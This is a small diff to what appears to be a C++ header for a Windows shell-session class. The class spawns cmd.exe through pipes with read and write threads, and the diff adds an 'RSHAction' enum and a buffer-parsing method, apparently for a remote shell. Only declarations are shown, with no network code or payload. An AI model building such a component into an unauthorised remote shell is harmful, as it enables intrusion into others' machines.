@@ -6,6 +6,11 @@
 #define HANDLE_LIST_SIZE 3
 #define DEFAULT_WIN_SHELL "\\system32\\cmd.exe"
 
+enum class RSHAction
+{
+	unknown, ignore, exit, end_session, cmd
+};
+
 class ShellSession
 {
 private:
@@ -17,6 +22,7 @@ private:
 	HANDLE hShellWriteThread;
 	CRITICAL_SECTION csReadPipe;
 	HANDLE CreateShell(HANDLE hPipeStdInput, HANDLE hPipeStdOutput);
+	RSHAction ParseBuffer(char* Buffer, DWORD &dwBufferSize);
 	// Thread Starter
 	static DWORD WINAPI StartReadShell(LPVOID lpParam);
 	static DWORD WINAPI StartWriteShell(LPVOID lpParam);
